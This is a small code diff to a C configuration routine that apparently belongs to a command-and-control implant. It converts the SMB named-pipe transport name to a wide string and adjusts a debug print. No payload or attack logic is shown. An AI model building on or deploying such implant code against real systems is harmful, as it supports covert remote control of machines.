@@ -149,10 +149,10 @@ VOID ConfigInit()
 #elif TRANSPORT_SMB
 
     Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.Name = Instance->Win32.LocalAlloc( LPTR, Length );
-    MemCopy( Instance->Config.Transport.Name, Buffer, Length );
+    Instance->Config.Transport.Name = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
+    CharStringToWCharString( Instance->Config.Transport.Name, Buffer, Length );
 
-    PRINTF( "[CONFIG] PipeName: %s\n", Instance->Config.Transport.Name );
+    PRINTF( "[CONFIG] PipeName: %ls\n", Instance->Config.Transport.Name );
 
 #endif
     ParserDestroy( &Parser );
